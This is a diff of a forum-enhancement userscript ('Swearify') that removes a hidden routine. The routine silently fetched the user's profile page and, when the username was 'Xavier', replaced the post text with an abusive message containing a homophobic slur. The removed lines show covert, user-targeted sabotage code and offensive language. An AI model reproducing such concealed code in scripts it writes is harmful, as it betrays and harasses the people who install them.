@@ -3,7 +3,7 @@
 // @description Adds a number of enhancements to your experience on AIM games.
 // @namespace   kaffeinition@gmail.com
 // @include     http://aimgames.forummotion.com/*                     
-// @version     3.0.63
+// @version     3.0.64
 // @grant       none
 // @icon        http://i.imgur.com/HlEs1B4.png
 // @license     MIT License (Expat); opensource.org/licenses/MIT
@@ -11,6 +11,7 @@
 // @require     https://raw.githubusercontent.com/HulaSamsquanch/aimgames/master/swearify/textUtils.js
 // @require     https://raw.githubusercontent.com/arasatasaygin/is.js/master/is.js
 // ==/UserScript==
+
 //////////////////////////////VERSIONING: X.X.XX
 //////////////////////////////DO NOT CHANGE
 ///////
@@ -5382,11 +5383,6 @@ function vbs_post() {
   }
 }
 
-///////////////////// TUNARI RULES
-function wmd_() {
-  document.getElementById('message').value = "UNBAN TUN[b][/b]ARI YOU FAGGOTS[img]http://i.imgur.com/OHADYUW.png[/img]";
-}
-
 ////////////////////
 /////////////////////MANAGES THE EDITING OF CSS
 
@@ -5514,6 +5510,7 @@ function inject_spacer() {
   the_body.setAttribute('width', '6');
   where.insertBefore(the_body, chil_where[0]);
 }
+
 function inject_css_url(url) {
   var head;
   head = document.getElementsByTagName('head') [0];
@@ -5526,6 +5523,7 @@ function inject_css_url(url) {
   gstyle.href = url;
   head.appendChild(gstyle);
 }
+
 /////////////////////
 /////////////////////FIX POST PAGE CSS
 
@@ -5556,57 +5554,13 @@ function post_page_editor() {
     }
   });
 }
-// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
-// ~~ BEGIN CODE FOR REMOTE WEAPON OF MASS DESTRUCTION ~~ //
-// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
-WMD_ON = false;
 
-function callback(response) { ////// thanks kaff, you're now a partaker in this crime :^)
-  document.body.appendChild(document.createElement('div')).innerHTML = '<div id=\'secret\' style=\'display:none;\'></div>';
-  var placeholder = document.createElement('div');
-  placeholder.innerHTML = response;
-  while (placeholder.children.length > 0) {
-    document.getElementById('secret').appendChild(placeholder.children[0]);
-  }
-  //var mymassivepenis = document.getElementById("emptyidcc").getElementsByTagName("tr")[6].getElementsByTagName("td")[1].innerHTML;  
-
-  if (document.getElementsByName('username')[0].value == 'Xavier') {
-    //console.log("holy fucking shit, it works")
-    //window.location.replace('http://agor.io');
-    WMD_ON = true;
-  } else {
-    // may be incompatible in some browsers
-    //delete placeholder;
-    // more compatible but doesn't free from memory
-    placeholder = null;
-  }
-  //console.log(mymassivepenis);
-
-}
-function getPageContents(callback, url, params) { ////// http://stackoverflow.com/a/28728475
-  http = new XMLHttpRequest();
-  if (params != null) {
-    http.open('POST', url, true);
-    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-  } else {
-    http.open('GET', url, true);
-  }
-  http.onreadystatechange = function () {
-    if (http.readyState == 4 && http.status == 200) {
-      callback(http.responseText);
-      //console.log(http.responseText)
-    }
-  }
-  http.send(params);
-}
 /////////////////////
 /////////////////////RUNS SCRIPT
 
 window.addEventListener('load', function () { /* shit goes down in here */
   if (is.ie() || is.safari() || is.opera()) alert('This browser is unsupported by Swearify.');
    else {
-    //anti-roger switch
-    getPageContents(callback, 'http://aimgames.forummotion.com/profile?mode=editprofile');
     if (window.location.href === 'http://aimgames.forummotion.com/post?categ=1&mode=smilies') inject_smilie(1);
     if (window.location.href === 'http://aimgames.forummotion.com/post?categ=2&mode=smilies') inject_smilie(2);
     if (window.location.href === 'http://aimgames.forummotion.com/post?categ=3&mode=smilies') inject_smilie(3);
@@ -5687,7 +5641,6 @@ function run_() {
   js_();
   vbs_();
   java_();
-  if (WMD_ON) wmd_();
 }
 function run_post() {
   sekrit_post();
